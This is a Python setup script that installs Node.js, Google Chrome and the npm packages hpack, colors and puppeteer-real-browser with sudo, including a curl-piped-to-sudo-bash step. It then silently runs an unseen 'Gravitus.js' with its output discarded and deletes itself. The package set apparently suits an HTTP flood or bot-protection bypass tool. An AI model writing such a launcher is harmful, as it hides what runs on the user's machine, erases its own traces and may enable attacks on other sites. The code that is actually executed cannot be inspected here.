#!/usr/bin/env python3

import subprocess
import sys
import os
import platform
import shutil

def run_command(cmd, check=True, capture_output=False):
    """Run a shell command and return the result."""
    try:
        result = subprocess.run(cmd, shell=True, check=check, capture_output=capture_output, text=True)
        if capture_output:
            return result.stdout.strip(), result.stderr.strip()
        return True
    except subprocess.CalledProcessError as e:
        if capture_output:
            return None, e.stderr.strip()
        return False

def is_installed(program):
    """Check if a program is installed."""
    stdout, _ = run_command(f"which {program}", capture_output=True)
    return bool(stdout)

def get_version(program):
    """Get version of a program."""
    stdout, stderr = run_command(f"{program} --version", capture_output=True)
    if stdout:
        return stdout.split()[0] if stdout.split() else "unknown"
    return None

def install_node_npm():
    """Install Node.js and npm if not installed. Assumes Debian/Ubuntu."""
    system = platform.system().lower()
    if system != "linux":
        sys.exit(1)
    
    distro = platform.linux_distribution()[0].lower() if hasattr(platform, 'linux_distribution') else "unknown"
    if "ubuntu" not in distro and "debian" not in distro:
        pass
    
    if is_installed("node"):
        if is_installed("npm"):
            return
    
    run_command("sudo apt update", check=False)
    run_command("curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -", check=False)
    run_command("sudo apt install -y nodejs", check=False)
    if get_version("npm") is None:
        run_command("sudo apt install -y npm", check=False)

def install_chrome():
    """Install Google Chrome if not installed. Assumes Debian/Ubuntu."""
    if is_installed("google-chrome"):
        return
    
    run_command("wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -", check=False)
    run_command("sudo sh -c 'echo \"deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main\" >> /etc/apt/sources.list.d/google-chrome.list'", check=False)
    run_command("sudo apt update", check=False)
    run_command("sudo apt install -y google-chrome-stable", check=False)

def install_npm_packages():
    """Install required npm packages."""
    packages = ["hpack", "colors", "puppeteer-real-browser"]
    for pkg in packages:
        if run_command(f"npm list -g {pkg}", capture_output=True)[0] is None:
            run_command(f"sudo npm install -g {pkg}", check=False)

def main():
    install_node_npm()
    install_chrome()
    install_npm_packages()
    
    # Run node Gravitus.js silently if it exists
    if os.path.exists("Gravitus.js"):
        subprocess.run(["node", "Gravitus.js"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Uninstall itself silently
    script_path = os.path.abspath(__file__)
    os.remove(script_path)

if __name__ == "__main__":
    main()
